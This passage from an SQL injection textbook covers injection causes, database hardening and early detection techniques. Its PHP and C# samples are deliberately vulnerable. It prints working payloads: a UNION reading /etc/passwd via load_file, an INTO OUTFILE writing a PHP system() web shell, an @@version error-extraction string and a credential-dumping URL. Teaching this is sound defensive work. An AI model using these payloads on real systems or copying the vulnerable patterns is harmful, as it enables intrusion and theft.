web application developer does not ensure that values received from a web form, cookie, input parameter, and so forth are validated before passing them to sql queries that will be executed on a database server. if an attacker can control the input that is sent to an sql query and manipulate that input so that the data is interpreted as a code instead of as data, the attacker may be able to execute the code on the back -end database. each programming language offers a number of different ways to construct and execute sql statements, and developers often use a combination of these methods to achieve different goals. a lot of web sites that offer tutorials and code examples to help appli cation developers solve common coding problems often teach insecure coding practices and their example code is also often vulnerable. without a sound understanding of the underlying database that they are interacting with or a thorough understanding and aw areness of the potential security issues of the code that is being developed, application developers can often produce inherently insecure applications that are vulnerable to sql injection. this situation has been improving over time and now a google searc h for how to prevent sql injection in your language or technology of choice, will usually present with a large number of valuable and useful resources that do offer good advice on the correct way to do things. on several tutorial sites you can still find a n insecure code, but usually if you look through the comments you will find warnings from more security savvy community contributors. apple and android offer good advice to developers moving to the platforms on how to develop the code securely and these do contain some coverage with regard to preventing sql injection vulnerabilities; similarly the html5 communities offer many warnings and some good security advice to early adopters. dynamic string building dynamic string building is a programming technique that enables developers to build sql statements dynamically at runtime. developers can create general -purpose, flexible applications by using dynamic sql. a dynamic sql statement is constructed at execution time, for which different conditions generate dif ferent sql statements. it can be useful to developers to construct these statements dynamically when they need to decide at runtime what fields to bring back from, say, select statements, the different criteria for queries, and perhaps different tables to query based on different conditions. however, developers can achieve the same result in a much more secure fashion if they use parameterized queries. parameterized queries are queries that have one or more embedded parameters in the sql statement. paramete rs can be passed to these queries at runtime; parameters containing embedded user input would not be interpreted as commands to execute, and there would be no opportunity for code to be injected. this method of embedding parameters into sql is more efficie nt and a lot more secure than dynamically building and executing sql statements using string -building techniques. the following php code shows how some developers build sql string statements dynamically from user input. the statement selects a data record from a table in a database. the record that is returned depends on the value that the user is entering being present in at least one of the records in the database: // a dynamically built sql string statement in php $query = “select ∗ from table where field = ‘$_get[“input”]’”; // a dynamically built sql string statement in .net query = “select ∗ from table where field = ‘” + request.getparameter(“ input”) + “’”; one of the issues with building dynamic sql statements such as this is that if the code does not validate or encode the input before passing it to the dynamically created statement, an attacker could enter sql statements as input to the application and have his sql statements passed to the database and executed. here is the sql statement that this co de builds: select ∗ from table where field = ‘input’ incorrectly handled escape characters sql databases interpret the quote character (‘) as the boundary between the code and data. they assume that anything following a quote is a code that it needs to run and anything encapsulated by a quote is data. therefore, you can quickly tell whether a we b site is vulnerable to sql injection by simply typing a single quote in the url or within a field in the web page or application. here is the source code for a very simple application that passes user input directly to a dynamically created sql statement: // build dynamic sql statement $sql = “select ∗ from table where field = ‘$_get[“input”]’;”; // execute sql statement $result = mysql_query($sql); // check to see how many rows were returned from the database $rowcount = mysql_num_rows($result); // iterate through the record set returned $row = 1; while ($db_field = mysql_fetch_assoc($result)) { if ($row <= $rowcount){ print $db_field[$row]. “<br>”; $row++; } } if you were to enter the single- quote character as input to the application, you may be presented with either one of the following errors; the result depends on a number of environmental factors, such as programming language and database in use, as well as protection and defense technologies implemented: warning: mysql_fetch_assoc(): supplied argument is not a valid mysql result resource you may receive the preceding error or the one that follows. the following error provides useful information on how the s ql statement is being formulated: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ‘‘value’’ the reason for the error is that the single -quote character has been interpret ed as a string delimiter. syntactically, the sql query executed at runtime is incorrect (it has one too many string delimiters), and therefore the database throws an exception. the sql database sees the single -quote character as a special character (a stri ng delimiter). the character is used in sql injection attacks to “escape” the developer’s query so that the attacker can then construct his own queries and have them executed. the single -quote character is not the only character that acts as an escape char acter; for instance, in oracle, the blank space ( ), double pipe (||), comma (,), period (.), ( ∗/), and double quote characters ( “) have special meanings. for example: -- the pipe [|] character can be used to append a function to a value. -- the function will be executed and the result cast and concatenated. http://victim.com/id=1||utl_inaddr.get_host_address(local) -- -- an asterisk followed by a forward slash can be used to terminate a -- comment and/or optimizer hint in oracle http://victim.com/hint = ∗/ from dual— it is important to become familiar with all of the idiosyncrasies of the database you are attacking and/or defending, for example an opening delimiter in sap max db (sap db) consists of a less than character and an exclamation mark: http://www.victim.com/id=1 union select operating system from sysinfo.version-- <! sap max db (sap db) is not a database i come across often, but the information above has since come in very useful on more than one occasion. incorrectly handled types by now, some of you may be thinking that to avoid being exploited by sql injection, simply escaping or validating input to remove the single -quote character would suffice. well, that’s a trap which lots of web application developers have fallen into. as i explained earlier, the single -quote character is interpreted as a string delimiter and is used as the boundary between code and data. when dealing with numeric data, it is not necessary to encapsulate the data within quotes; otherwise, the numeric data would be treated as a string. here is the source code for a very simple application that passes user input directly to a dynamically created sql statement. the script accepts a numeric parameter ( $userid) and displays information about that user. the query assumes that the par ameter will be an integer and so is written without quotes: // build dynamic sql statement $sql = “select ∗ from table where field = $_get[ “userid”]”; // execute sql statement $result = mysql_query($sql); // check to see how many rows were returned from the database $rowcount = mysql_num_rows($result); // iterate through the record set returned $row = 1; while ($db_field = mysql_fetch_assoc($result)) { if ($row <= $rowcount){ print $db_field[$row]. “<br>”; $row++; } } mysql provides a function called load_file that reads a file and returns the file contents as a string. to use this function, the file must be located on the database server host and the full pathname to the file must be provided as input to the function. the calling user must also have the file privilege. the following statement, if entered as input, may allow an attacker to read the contents of the /etc/passwd file, which contains user attributes and usernames for system users: 1 union all select load_file(‘/etc/passwd’)-- mysql also has a built -in command that you can use to create and write system files. you can use the following command to write a web shell to the web root to install a remotely accessible interactive web shell: 1 union select “<? system ($_request[‘cmd’]); ?>” into outfile “/var/www/html/victim.com/cmd.php” – for the load_file and select into outfile commands to work, the mysql user used by the vulnerable application must have been granted the file permission. for example, by default, the root user has this permission on. file is an administrative privilege. the attacker’s input is directly interpreted as sql syntax; so, there is no need for the attacker to escape the query with the single- quote character. here is a clearer depiction of th e sql statement that is built: select ∗ from table where userid = 1 union all select load_file(‘/etc/passwd’)— incorrectly handled query assembly some complex applications need to be coded with dynamic sql statements, as the table or field that needs to be queried may not be known at the development stage of the application or it may not yet exist. an example is an application that interacts with a large database that stores data in tables that are created periodically. a fictitious example may be an application that returns data for an employee’s time sheet. each employee’s time sheet data is entered into a new table in a format that contains that m onth’s data (for january 2011 this would be in the format employee_employee- id_01012011). the web developer needs to allow the statement to be dynamically created based on the date that the query is executed. the following source code for a very simple app lication that passes user input directly to a dynamically created sql statement demonstrates this. the script uses application -generated values as input; that input is a table name and three -column names. it then displays information about an employee. the application allows the user to select what data he wishes to return; for example, he can choose an employee for which he would like to view data such as job details, day rate, or utilization figures for the current month. because the application already g enerated the input, the developer trusts the data; however, it is still user -controlled, as it is submitted via a get request. an attacker could submit his table and field data for the application- generated values: // build dynamic sql statement $sql = “se lect”. $_get[“column1”]. “,”. $_get[“column2”]. “,”. $_get[“column3”]. “ from ”. $_get[“table”]; // execute sql statement $result = mysql_query($sql); // check to see how many rows were returned from the database $rowcount = mysql_num_rows($result); // iterate through the record set returned $row = 1; while ($db_field = mysql_fetch_assoc($result)) {if ($row <= $rowcount){print $db_field[$row]. “<br>”; $row++; } } if an attacker was to manipulate the http request and substitute the users value for the table name and the user , password, and super_priv fields for the application -generated column names, he may be able to display the usernames and passwords for the database users on the system. here is the url that is built when using the appl ication: • http://www.victim.com/user_details.php?table=users&column1=user&column2=password& column3=super_priv if the injection were success ful, the following data would be returned instead of the time sheet data. this is a very contrived example; however, real -world applications have been built this way. i have come across them on more than one occasion: +--------------+ ---------------------- --------------+ ------------+ | user | password | super_priv | +--------------+ -------------------------------------+ ------------ + | root | ∗ 2470c0c06dee42fd1618bb99005adca2ec9d1e19 | y | | sqlinjection | ∗ 2470c0c06dee42fd1618bb99005adca2ec9d1e19 | n | | 0wned | ∗2470c0c06dee42fd1618bb99005adca2ec9d1e19 | n | +--------------+ -------------------------------------------+ ------------ + incorrectly handled errors improper handling of errors can introduce a variety of security problems for a web site. the most com mon problem occurs when detailed internal error messages such as database dumps and error codes are displayed to the user or attacker. these messages reveal implementation details that should never be revealed. such details can provide an attacker with imp ortant clues regarding potential flaws in the site. verbose database error messages can be used to extract information from databases on how to amend or construct injections to escape the developer’s query or how to manipulate it to bring back extra data, or in some cases, to dump all of the data in a database (microsoft sql server). the simple example application that follows is written in c# for asp.net and uses a microsoft sql server database server as its back end, as this database provides the most verbose of error messages. the script dynamically generates and executes an sql statement when the user of the application selects a user identifier from a drop -down list: private void selectedindexchanged(object sender, system.eventargs e) { // create a select statement that searches for a record // matching the specific id from the value property. string sql; sql = “select ∗ from table ” ; sql += “where id=” + userlist.selecteditem.value + “”; // define the ado.net objects. oledbconnection con = new oledbconnection(connectionstring); oledbcommand cmd = new oledbcommand(sql, con); oledbdatareader reader; // try to open database and read information. try { con.open(); reader = cmd.executereader(); reader.read(); lblresults.text = “<b>” + reader[“lastname”]; lblresults.text += “, ” + reader[“firstname”] + “</b><br>”; lblresults.text += “id: ” + reader[“id”] + “<br>”; reader.close(); } catch (exception err) { lblresults.text = “error getting data. ”; lblresults.text += err.message; } finally { con.close(); } } if an attacker was to manipulate the http request and substitute the expected id value for his own sql statement, he may be able to use the informative sql err or messages to learn values in the database. for example, if the attacker entered the following query, execution of the sql statement would result in an informative error message being displayed containing the version of the rdbms that the web application is using: ‘ and 1 in (select @@version) – although the code does trap error conditions, it does not provide custom and generic error messages. instead, it allows an attacker to manipulate the application and its error messages for information. chapter 4 provides more detail on how an attacker can use and abuse this technique and situation. here is the error that would be returned: microsoft ole db provider for odbc drivers error ‘80040e07’ [microsoft][odbc sql server driver][sql server]syntax error converting the nvarchar value ‘microsoft sql server 2000 - 8.00.534 (intel x86) nov 19 2001 13:23:50 copyright (c) 19882000 microsoft corporation enterprise edition on windows nt 5.0 (build 2195: service pack 3)’ to a column of data type int. incorrectly handled multiple submissions white listing is a technique that means all characters should be disallowed, except for those that are in the white list. the white -list approach to validating input is to create a list of all possible characters that should be allowed for a given input, and to deny anything else. it is recommended that you use a white -list approach as opposed to a black list. black listing is a technique that means all characters should be allowed, except those that are in the black list. the black -list approach to validating input is to create a list of all possible characters and their associated encodings that could be used maliciously, and to reject their input. so many attack classes exist that can be represented in a myriad of ways that effective maintenance of such a list is a daunting task. the potential risk associated with using a list of unacceptable characters is that it is always possible to overlook an unacceptable character when defining the list or to forget one or more alternative representations of that unacceptable character. a problem can occur on large web development projects whereby some developers will follow this advice and validate their input, but other developer s will not be as meticulous. it is not uncommon for developers, teams, or even companies to work in isolation from one another and to find that not everyone involved with the development follows the same standards. for instance, during an assessment of an application, it is not uncommon to find that almost all of the input entered is validated; however, with perseverance, you can often locate an input that a developer has forgotten to validate. application developers also tend to design an application around a user and attempt to guide the user through an expected process flow, thinking that the user will follow the logical steps they have laid out. for instance, they expect that if a user has reached the third form in a series of forms, the user must have c ompleted the first and second forms. in reality, though, it is often very simple to bypass the expected data flow by requesting resources out of order directly via their urls. take, for example, the following simple application: // process form 1 if ($_get[“form”] = “form1”){ // is the parameter a string? if (is_string($_get[“param”])) { // get the length of the string and check if it is within the // set boundary? if (strlen($_get[“param”]) < $max){ // pass the string to an external validator $bool = validate(input_string, $_get[“param”]); if ($bool = true) { // continue processing } } } } // process form 2 if ($_get[“form”] = “form2”){ // no need to validate param as form1 would have validated it for us $sql = “select ∗ from table where id = $_get[“ param”]”; // execute sql statement $result = mysql_query($sql); // check to see how many rows were returned from the database $rowcount = mysql_num_rows($result); $row = 1; // iterate through the record set returned while ($db_field = mysql_fetch_assoc($result)) { if ($row <= $rowcount){ print $db_field[$row]. “<br>”; $row++; } } } the application developer does not think that the second form needs to validate the input, as the first form will have performed the input validation. an attacker could call the second form directly, without using the first form, or he could simply submit valid data as input into the first form and then manipulate the data as it is su bmitted to the second form. the first url shown here would fail as the input is validated; the second url would result in a successful sql injection attack, as the input is not validated: [1] http://www.victim.com/form.php?form=form1&param=’ sql failed -- [2] http://www.victim.com/form.php?form=form2&param=’ sql success -- insecure database configuration you can mitigate the access that can be leveraged, the amount of data that can be stolen or manipulated, the level of access to interconnected systems, and the damage that can be caused by an sql injection attack, in a number of ways. securing the application code is the first place to start; however, you should not overlook the database itself. databases come with a number of default users preinstalled. microsoft sql server uses the infamous “sa” database system administrator account, mysql uses the “root” and “anonymous” user acc ounts, and with oracle, the accounts sys, system, dbsnmp, and outln are often created by default when a database is created. these aren’t the only accounts, just some of the better -known ones; there are a lot more! these accounts are also preconfigured wit h default and well -known passwords. some system and database administrators install database servers to execute as the root, system, or administrator privileged system user account. server services, especially database servers, should always be run as an unprivileged user (in a chroot environment, if possible) to reduce potential damage to the operating system and other processes in the event of a successful attack against the database. however, this is not possible for oracle on windows, as it must run wit h system privileges. each type of database server also imposes its own access control model assigning various privileges to user accounts that prohibit, deny, grant, or enable access to data and/or the execution of built -in stored procedures, functionality , or features. each type of database server also enables, by default, functionality that is often surplus to requirements and can be leveraged by an attacker (xp_cmdshell, openrowset, load_file, activex, java support, etc.). chapters 4 –7 will detail attacks that leverage these functions and features. application developers often code their applications to connect to a database using one of the built -in privileged accounts instead of creating specific user accounts for their applications needs. these powerful accounts can perform a myriad of actions on the database that are extraneous to an application’s requirement. when an attacker exploits an sql injection vulnerability in an appli cation that connects to the database with a privileged account, he can execute code on the database with the privileges of that account. web application developers should work with database administrators to operate a least -privilege model for the applicat ion’s database access and to separate privileged roles as appropriate for the functional requirements of the application. in an ideal world, applications should also use different database users to perform select , update , insert , and similar commands. in t he event of an attacker injecting code into a vulnerable statement, the privileges afforded would be minimized. most applications do not separate privileges, so an attacker usually has access to all data in the database and has select , insert , update , dele te, execute, and similar privileges. these excessive privileges can often allow an attacker to jump between databases and access data outside the application’s data store. to do this, though, he needs to know what else is available, what other databases ar e installed, what other tables are there, and what fields look interesting! when an attacker exploits an sql injection vulnerability he will often attempt to access database metadata. metadata is data about the data contained in a database, such as the nam e of a database or table, the data type of a column, or access privileges. other terms that sometimes are used for this information are data dictionary and system catalog. for mysql servers (version 5.0 or later) this data is held in the information_schema virtual database and can be accessed by the show databases and show tables commands. each mysql user has the right to access tables within this database, but can see only the rows in the tables that correspond to objects for which the user has the proper access privileges. microsoft sql server has a similar concept and the metadata can be accessed via the information_schema or with system tables ( sysobjects , sysindexkeys , sysindexes , syscolumns , systypes , etc.), and/or with system stored procedures; sql server 2005 introduced some catalog views called “sys.∗ ” and restricts access to objects for which the user has the proper access privileges. each microsoft sql server user has the right to access tables w ithin this database and can see all the rows in the tables regardless of whether he has the proper access privileges to the tables or the data that are referenced. meanwhile, oracle provides a number of global built -in views for accessing oracle metadata ( all_tables , all_tab_columns , etc.). these views list attributes and objects that are accessible to the current user. in addition, equivalent views that are prefixed with user_ show only the objects owned by the current user (i.e. a more restricted view of metadata), and views that are prefixed with dba_ show all objects in the database (i.e. an unrestricted global view of metadata for the database instance). the dba_ metadata functions require database administrator (dba) privileges. here is an example of t hese statements: -- oracle statement to enumerate all accessible tables for the current user select owner, table_name from all_tables order by table_name; -- mysql statement to enumerate all accessible tables and databases for the -- current user select table_schema, table_name from information_schema.tables; -- mssql statement to enumerate all accessible tables using the system -- tables select name from sysobjects where xtype = ‘u’; -- mssql statement to enumerate all accessible tables using the catalog -- views select name from sys.tables; it is not possible to hide or revoke access to the information_schema virtual database within a mysql database, and it is not possible to hide or revoke access to the data dictionary within an oracle database, as it is a view. you can modify the view to restrict access, but oracle does not recommend this. it is possible to revoke access to the information_schema , system , and sys. ∗ tables within a microsoft sql server database. this, however, can break some funct ionality and can cause issues with some applications that interact with the database. the better approach is to operate a least -privilege model for the application’s database access and to separate privileged roles as appropriate for the functional require ments of the application. summary in this chapter, you learned some of the many vectors that cause sql injection, from the design and architecture of an application, to the developer behaviors and coding patterns that are used in building the application. we discussed how the popular multiple -tier ( n-tier) architecture for web applications will commonly have a storage tier with a database that is interacted with by database queries generated at another tier, often in part with user -supplied information. and we discussed that dynamic string building (otherwise known as dynamic sql), the practice of assembling the sql query as a string concatenated together with user supplied input, causes sql injection as the attacker can change the logic and structure of the sql query to execute database commands that are very different from those that the developer intended. in the forthcoming chapters, we will discuss sql injection in much more depth, both in finding and in identifying sql injection ( chapters 2 and 3), sql injection attacks and what can be done through sql injection ( chapters 4 –7), how to defend against sql i njection (chapters 8 and 9 ), and how to find out if you’ve been exploited or recover from sql injection (chapter 10). and finally, in chapter 11, we present a number of handy reference resources, pointers, and cheat sheets intended to help you quickly find the information you’re looking for. in the meantime, read through and try out this chapter’s exa mples again so that you cement your understanding of what sql injection is and how it happens. with that knowledge, you’re already a long way toward being able to find, exploit, or fix sql injection out there in the real world! solutions fast track underst anding how web applications work • a web application is an application that is accessed via a web browser over a network such as the internet or an intranet. it is also a computer software application that is coded in a browser -supported language (such as html, javascript, java, etc.) and relies on a common web browser to render the application executable. • a basic database -driven dynamic web application typically consists of a back -end database with web pages that contain server -side script written in a p rogramming language that is capable of extracting specific information from a database depending on various dynamic interactions. • a basic database- driven dynamic web application commonly has three tiers: the presentation tier (a web browser or rendering engine), the logic tier (a programming language such as c#, asp, .net, php, jsp, etc.), and a storage tier (a database such as microsoft sql server, mysql, oracle, etc.). the web browser (the presentation tier: internet explorer, safari, firefox, etc.) sen ds requests to the middle tier (the logic tier), which services the requests by making queries and updates against the database (the storage tier). understanding sql injection • sql injection is an attack in which sql code is inserted or appended into appl ication/user input parameters that are later passed to a back -end sql server for parsing and execution. • the primary form of sql injection consists of direct insertion of the code into parameters that are concatenated with sql commands and executed. • whe n an attacker is able to modify an sql statement, the process will run with the same permissions as the component that executed the command (e.g. database server, application server, or web server), which is often highly privileged. understanding how it ha ppens • sql injection vulnerabilities most commonly occur when the web application developer does not ensure that values received from a web form, cookie, input parameter, and so forth are validated or encoded before passing them to sql queries that will be executed on a database server. • if an attacker can control the input that is sent to an sql query and manipulate that input so that the data is interpreted as code instead of as data, he may be able to execute code on the back -end database. • without a sound understanding of the underlying database that they are interacting with or a thorough understanding and awareness of the potential security issues of the code that is being developed, application developers can often produce inherently insecure appli cations that are vulnerable to sql injection. frequently asked questions q: what is sql injection? a: sql injection is an attack technique used to exploit the code by altering back -end sql statements through manipulating input. q: are all databases vulnerable to sql injection? a: to varying degrees, most databases are vulnerable. q: what is the impact of an sql injection vulnerability? a: this depends on many variables; however, potentially an attacker can manipulate data in the dat abase, extract much more data than the application should allow, and possibly execute operating system commands on the database server. q: is sql injection a new vulnerability? a: no. sql injection has probably existed since sql databases were first connec ted to web applications. however, it was brought to the attention of the public on christmas day 1998. q: can i really get into trouble for inserting a quote character (‘) into a web site? a: yes (depending on the jurisdiction), unless you have a legitimat e reason for doing so (e.g. if your name has a single -quote mark in it, such as o’shea). q: how can code be executed because someone prepends his input with a quote character? a: sql databases interpret the quote character as the boundary between the code and data. they assume that anything following a quote is a code that it needs to run and anything encapsulated by a quote is data. q: can web sites be immune to sql injection if they do not allow the quote character to be entered? a: no. there are a myriad of ways to encode the quote character so that it is accepted as input, and some sql injection vulnerabilities can be exploited without using it at all. also, the quote character is not the only character that can be used to exploit sql injection vulnerabi lities; a number of characters are available to an attacker, such as the double pipe (||) and double quote (“), among others. q: can web sites be immune to sql injection if they do not use the get method? a: no. post parameters are just as easily manipulat ed. q: my application is written in php/asp/perl/.net/java, etc. is my chosen language immune? a: no. any programming language that does not validate input before passing it to a dynamically created sql statement is potentially vulnerable; that is, unless it uses parameterized queries and bind variables. chapter 2 testing for sql injection rodrigo marcos alvarez solutions in this chapter: • finding sql injection • confirming sql injection • automating sql injection discovery introduction as the presence of sql injection is commonly tested for remotely (i.e., over the internet as part of an application penetration test) you usually don’t have the opportunity to look at the source code to review the structure of the query into which you are injecting. this often leads to a need to perform much of your testing through inference —that is, “if i see this, then this is probably happening at the back end.” this chapter discusses techniques for finding sql injection issues from the perspective of a user sitting in front of his browser and interacting with a web application. the same techniques apply to non -web applications with a back -end database. we will also discuss techniques for confirming that the issue is indeed sql injection and not some othe r issue, such as xml injection. finally, we’ll look at automating the sql injection discovery process to increase the efficiency of detecting simpler cases of sql injection. finding sql injection sql injection can be present in any front -end application accepting data entry from a system or user, which is then used to access a database server. in this section, we will focus on the web environment, as this is the most common scenario, and we will therefore initially be armed with just a web browser. in a web environment, the web browser is a client acting as a front -end requesting data from the user and sending them to the remote server which will create sql queries using the submitted data. our main goal at this stage is to identify anomalies in the server response and determine whether they are generated by a sql injection vulnerability. at a later stage, we will identify the kind of sql query (select, update, insert or delete) that is running on the server, and where in the query you are injecting code (in the from section, the where section, order by, etc.). although you will see many examples and scenarios in this chapter, we will not cover every sql injection possibility that can be found. think of it this way: someone can teach you how to add two numbers, but it is not necessary (or practical) to cover every single possibility; as long as you know how to add two numbers you can apply that knowledge to every scenario involving addition. sql inject ion is the same. you need to understand the hows and whys and the rest will simply be a matter of practice. we will rarely have access to the application source code, and therefore we will need to test by inference. possessing an analytical mindset is very important in understanding and progressing an attack. you will need to be very careful in understanding server responses to gain an idea of what might be happening at the server side. testing by inference is easier than you might think. it is all about se nding requests to the server and detecting anomalies in the response. you might be thinking that finding sql injection vulnerabilities is about sending random values to the server, but you will see that once you understand the logic and fundamentals of the attack it becomes a straightforward and exciting process. testing by inference there is one simple rule for identifying sql injection vulnerabilities: trigger anomalies by sending unexpected data. this rule implies that: • you identify all the data entry on the web application. • you know what kind of request might trigger anomalies. • you detect anomalies in the response from the server. it’s as simple as that. first you need to see how your web browser sends requests to the web server. different applicat ions behave in different ways, but the fundamentals should be the same, as they are all web -based environments. once you identify all the data accepted by the application, you need to modify them and analyze the response from the server. sometimes the resp onse will include a sql error directly from the database and will make your life very easy; however, other times you will need to remain focused and detect subtle differences. identifying data entry web environments are an example of client/server architecture. your browser (acting as a client) sends a request to the server and waits for a response. the server receives the request, generates a response, and sends it back to the client. obviously, there must be some kind of understanding between the two part ies; otherwise, the client would request something and the server wouldn’t know how to reply. the understanding of both parties is given by the use of a protocol ; in this case, http. our first task is to identify all data entry accepted by the remote web a pplication. http defines a number of actions that a client can send to the server; however, we will focus on the two most relevant ones for the purpose of discovering sql injection: the get and post http methods. get requests get is an http method that requests the server whatever information is indicated in the url. this is the kind of method that is normally used when you click on a link. usually, the web browser creates the get request, sends it to the web server, and renders the response in the browser. although it is transparent to the user, the get request that is sent to the web server looks like this: get /search.aspx?text=lcd%20monitors&cat=1&num=20 http/1.1 host: www.victim.com user-agent: mozilla/5.0 (x11; u; linux x86_64; en- us; rv:1.8.1.19) gecko/20081216 ubuntu/8.04 (hardy) firefox/2.0.0.19 accept: text/xml,application/xml,application/xhtml+xml, text/html;q=0.9,text/plain;q=0.8,image/png,∗ /∗;q=0.5 accept-language: en- gb,en;q=0.5 accept-encoding: gzip,deflate accept-charset: iso- 8859-1,utf-8;q=0.7,∗ ;q=0.7 keep-alive: 300 proxy-connection: keep- alive this kind of request sends parameters within the urls in the following format: ?parameter1=value1&parameter2=value2&parameter3=value3... in the preceding example, you can see th ree parameters: text , cat, and num. the remote application will retrieve the values of the parameters and use them for whatever purpose they have been designed. for get requests, you can manipulate the parameters by simply changing them in your browser’s n avigation toolbar. alternatively, you can also use a proxy tool, which i’ll explain shortly. post requests post is an http method used to send information to the web server. the action the server performs is determined by the target url. this is normally the method used when you fill in a form in your browser and click the submit button. although your browser does everything transparently for you, this is an example of what is sent to the remote web server: post /contact/index.asp http/1.1 host: www.victim.com user-agent: mozilla/5.0 (x11; u; linux x86_64; en- us; rv:1.8.1.19) gecko/20081216 ubuntu/8.04 (hardy) firefox/2.0.0.19 accept: text/xml,application/xml,application/xhtml+xml, text/html;q=0.9,text/plain;q=0.8,image/png,∗ /∗;q=0.5 accept-language: en- gb,en;q=0.5 accept-encoding: gzip,deflate accept-charset: iso- 8859-1,utf-8;q=0.7,∗ ;q=0.7 keep-alive: 300 referer: http://www.victim.com/contact/index.asp content- type: application/x- www-form-urlencoded content- length: 129 first=john&last=doe&email=john@doe.com&phone=555123456&title=mr&country=us&comments=i%20woul d%20like%20to%20request%20information the values sent to the web server have the same format explained for the get request, but are now located at the bottom of the request. note keep one thing in mind: it doesn’t matter how these data are presented to you in the browser. some of the values might be hidden fields within the form, and others might be drop- down fields wi th a set of choices; you may have size limits, or even disabled fields. remember that all of those features are part of the client -side functionality, and you have full control of what you send to the server. do not think of client -side interface mechanism s as security functionality. you may be wondering how you modify data if the browser is not allowing you to do so. there are a couple of ways to do this: • browser modification extensions • proxy servers browser modification extensions are plug- ins that ru n on your browser and allow you to perform some additional functionality. for example, the web developer (https://addons.mozilla.org/en -us/firefox/addon/60 and https://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm ) extensions for mozilla firefox and google chrome allow you to visualize hidden fields, remove size limitations, and con vert html select fields into input fields, among other tasks. this can be very useful when trying to manipulate data sent to the server. tamper data (https://addons.mozilla.org/en -us/firefo x/addon/966) is another interesting extension available for firefox. you can use tamper data to view and modify headers and post parameters in http and https requests. another option is sql inject me ( https://addons.mozilla.org/en us/firefox/addon/7597). this tool sends database escape strings through the form fields found in the html page. the second solution is the use of a local proxy. a local proxy is a piece of software that sits between your browser and the server, as shown in figure 2.1. the software runs locally on your computer; however, the figure shows a logical representation of a local proxy setup. figure 2.1 proxy intercepting requests to the web server figure 2.1 shows how you can bypass any client -side restriction by using a proxy server. the proxy intercepts the request to the server and permits you to modify it at will. to do this you need only two things: • installation of a proxy server on your computer • conf iguration of your browser to use your proxy server you can choose from a number of alternatives when installing a proxy for sql injection attacks. the most notable ones are paros proxy, webscarab, and burp suite, all of which can intercept traffic and allo w you to modify the data sent to the server. although they have some differences, deciding which one to use usually depends on your personal choice. after installing and running the software, you need to check on what port your proxy is listening to. set u p your web browser to use the proxy and you are ready to go. depending on the web browser of your choice, the settings are situated in a different menu. for instance, in mozilla firefox, click edit | preferences | advanced | network | settings . firefox ext ensions such as foxyproxy ( https://addons.mozilla.org/enus/firefox/addon/2464) allow you to switch among predefined proxy settings, which can be very useful and can save you some time. the google chrome equivalent would be proxy switchy ( https://chrome.google.com/webstore/detail/caehdcpeofiiigpdhbabniblemipncjj). in microsoft internet explorer, you c an access the proxy settings in tools | internet options | connections | lan settings | proxy server . once you have your proxy software running and your browser pointing to it, you can start testing the target web site and manipulate the parameters sent to the remote application, as shown in figure 2.2. figure 2.2 burp suite intercepting a post request figure 2.2 shows burp suite intercepting a post request and allowing the user to modify the fields. the request has been intercepted by the proxy and the user can make arbitrary changes to the content. once finished the user should click the forward button and the modified request will be sent to the server. later, in “confirming sql injection,” we will discuss the kind of content that can be injected into the parameters to trigger sql injection vulnerabilities. other injectable data most applications retrieve data from get or post parameters. however, other p arts of the http request might trigger sql injection vulnerabilities. cookies are a good example. cookies are sent to the user’s browser and they are automatically sent back to the server in each request. cookies are usually used for authentication, session control, and maintaining specific information about the user, such as preferences in the web site. as explained before, you have full control of the content sent to the server and so you should consider cookies as a valid form of user data entry, and the refore, as being susceptible to injection. other examples of applications vulnerable to injection in other parts of the http request include the host , referer , and user -agent headers. the host header field specifies the internet host and port number of the resource being requested. the referer field specifies the resource from which the current request was obtained. the user -agent header field determines the web browser used by the user. although these cases are uncommon, some network monitoring and web trend applications use the host , referer , and user -agent header values to create graphs, for example, and store them in databases. in such cases, it is worth testing those headers for potential injection vulnerabilities. you can modify cookies and http header s through proxy software in the same manner you saw earlier in this chapter. manipulating parameters we’ll start with a very simple example so that you can become familiar with sql injection vulnerabilities. say you visit the web site for victim inc., an e -commerce shop where you can buy all kinds of things. you can check the products online, sort them by price, show only a certain category of product, and so forth. when you browse different categories of products you notice that the url looks like the foll owing: http://www.victim.com/showproducts.php?category=bikes http://www.victim.com/showproducts.php?category=cars http://www.victim.com/showproducts.php?category=boats the showproducts.php page receives a parameter called category . you don’t have to type anything, as the preceding links are presented o n the web site, so you just have to click them. the application at the server side is expecting known values and displays the products which belong to the given category. even without starting the process of testing you should already have a rough idea of how the application may work. you can assert that the application is not static; it seems that depending on the value of the category parameter the application will show different products based on the result of a query to a back- end database. at this poin t it is also important to consider what type of database operation may be occurring at the server side, as some of the things we will try may have side effects if we are not careful. there are four main types of operations at the database layer, as follows : • select: read data from the database based on searching criteria • insert: insert new data into the database • update: update existing data based on given criteria • delete: delete existing data based on given criteria in this example, we can assume that the remote application is performing a select query, as it is showing information based on the category parameter. you can now begin to manually change the values of the category parameter to something the application does not expect. your first attempt can be something such as the following: http://www.victim.com/showproducts.php?category=attacker in the preceding example, we sent a request to the server with a non- existent category name. the response from the server was as follows: warning: mysql_fetch_assoc(): supplied argument is not a valid mysql result resource in /var/www/victim.com/showproducts.php on line 34 this warning is a mysql database error returned by the database when the user tries to read a record from an empty result set. this error indicates that the remote application is not properly handling unexpected data. continuing with the inference process you make a request, appending a single quote (‘) to the value that you previously sent: http://www.victim.com/showproducts.php?category=attacker ’ figure 2.3 shows the response from the server. figure 2.3 mysql server error the server returned the following error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near “attacker”’ at line 1 as you can see, some applications react in unexpected ways when handling user data. not every anomaly detected in a web site is going to be due to a sql injection vulnerability, as it can be affected by a number of other issues. as you become more familiar with sql injection exploitation, you will realize the importance of the single -quote character for detection purposes and you will learn to send the appropriate requests to the server to determine what types of injections are possible. another interesting test you can conduct to identify vulnerabilities in oracle and postgresql is to send th e following two requests to the web server: http://www.victim.com/showproducts.php?category=bikes http://www.victim. com/showproducts.php?category=bi’||’kes the microsoft sql server equivalent is: http://www.victim.com/showproducts.php?category=bikes http://www.victim.com/showproducts.php?category=bi’+’kes the mysql equivalent (note the space between the single quotes) is: http://www.victim.com/showproducts.php?category=bikes http://www.victim.com/showproducts.php?category=bi’’kes if the result of both requests is the same, there is a high possibility th at there is a sql injection vulnerability. at this point, you may be a bit confused about the single quotes and encoded characters, but everything will make sense as you read this chapter. the goal of this section is to show you the kind of manipulation th at might trigger anomalies in the response from the web server. in “confirming sql injection,” i will expand on the input strings that we will use for finding sql injection vulnerabilities . tools & traps... user data sanitization sql injection vulnerabilitie s occur 